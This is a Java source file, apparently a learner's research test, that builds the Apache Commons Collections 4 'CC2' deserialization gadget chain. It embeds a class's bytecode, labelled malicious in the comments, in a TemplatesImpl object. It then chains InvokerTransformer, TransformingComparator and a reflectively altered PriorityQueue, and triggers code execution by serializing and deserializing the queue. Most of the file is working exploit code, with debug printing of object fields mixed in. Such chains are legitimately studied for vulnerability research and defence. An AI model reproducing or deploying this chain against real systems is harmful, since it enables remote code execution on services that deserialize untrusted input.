package CC;

import javassist.ClassPool;
import javassist.CtClass;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.*;
import java.io.PrintStream;

/*
ObjectInputStream.readObject()
  PriorityQueue.readObject()
    PriorityQueue.heapify()
      PriorityQueue.siftDown()
        PriorityQueue.siftDownUsingComparator()
          TransformingComparator.compare()
            InvokerTransformer.transform()
              Method.invoke()
*/

public class CC2Test {
    public static void main(String[] args) throws Exception {
        //构造恶意类TestTemplatesImpl并转换为字节码
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.getCtClass("CC.TestTemplatesImpl");
        byte[] bytes = ctClass.toBytecode();

        //反射创建TemplatesImpl
        Class<?> aClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Constructor<?> constructor = aClass.getDeclaredConstructor(new Class[]{});
        Object TemplatesImpl_instance = constructor.newInstance();

        //将恶意类的字节码设置给_bytecodes属性
        Field bytecodes = aClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(TemplatesImpl_instance, new byte[][]{bytes});

        //设置属性_name为恶意类名
        Field name = aClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(TemplatesImpl_instance, "TestTemplatesImpl");

        //构造利用链
        InvokerTransformer transformer = new InvokerTransformer("newTransformer", null,null);
        TransformingComparator transformer_comparator = new TransformingComparator(transformer,null);
        System.out.println(transformer);
        System.out.println(System.getProperty("file.encoding"));

        String[] classlist = {
                "org.apache.commons.collections4.comparators.TransformingComparator",
                "org.apache.commons.collections4.functors.InvokerTransformer"
        };
        Object[] object_list = new Object[classlist.length]; // 声明一个对象数组

        System.out.println("================对象生成=================");
        int object_sort = 0;
        for (String classname: classlist) {
            System.out.println(classname);
            Class<?> target_classname = Class.forName(classname);
            Constructor[] constructor_classname=target_classname.getConstructors();

            Class[] para_list = null;
            int para_len = 0;
            for (Constructor each_constructor:constructor_classname) {
                //获取参数列表
                Class [] paramType=each_constructor.getParameterTypes();
                /*            System.out.println(paramType.length);*/
                if (paramType.length > para_len) {
                    Class[] local_list = new Class[paramType.length];
                    int i = 0;
                    for (Class param : paramType) {
                        if (i < paramType.length) {
                            local_list[i] = param;
                            i++;
                        }
                    }
                    para_len = paramType.length;
                    para_list = local_list;
                }
            }
            Constructor constructor_object = target_classname.getConstructor(para_list);
            Class[] para = new Class[para_list.length];
            for (int i = 0; i < para_list.length; i++ ) {
                para[i] = null;
            }
            Object objtest = constructor_object.newInstance(para);
            object_list[object_sort] = objtest;
            object_sort++;

            System.out.println("对象属性为");
            //打印对象所有属性
            Field[] fields122311 = objtest.getClass().getDeclaredFields();//获取所有属性
            Arrays.stream(fields122311).forEach(field1 -> {
                //获取是否可访问
                boolean flag = field1.isAccessible();
                try {
                    //设置该属性总是可访问
                    field1.setAccessible(true);
                    System.out.println("成员变量" + field1.getName() + "的值为:" + field1.get(objtest));
                } catch (IllegalAccessException e) {
                    e.printStackTrace();
                }
                //还原可访问权限
                field1.setAccessible(flag);
            });
        }
        for (Object object1: object_list) {
            System.out.println(object1);
        }
        System.out.println("==========================================");

        //触发漏洞
        PriorityQueue queue = new PriorityQueue(3);
        queue.add(1);
        queue.add(1);

        //设置comparator属性
        Field field = queue.getClass().getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(queue, transformer_comparator);

        //设置queue属性
        field = queue.getClass().getDeclaredField("queue");
        field.setAccessible(true);
        //队列至少需要2个元素
        Object[] objects = new Object[]{TemplatesImpl_instance, TemplatesImpl_instance};
        field.set(queue, objects);

        System.out.println("queue的属性为");
        //打印对象所有属性
        Field[] fields2 = queue.getClass().getDeclaredFields();//获取所有属性
        Arrays.stream(fields2).forEach(field1 -> {
            //获取是否可访问
            boolean flag = field1.isAccessible();
            try {
                //设置该属性总是可访问
                field1.setAccessible(true);
                System.out.println("变量类型为:" + field1.getType().getName() + ", 成员变量" + field1.getName() + "的值为:" + field1.get(queue));
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
            //还原可访问权限
            field1.setAccessible(flag);
        });

        //序列化 ---> 反序列化
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object object = ois.readObject();
    }
}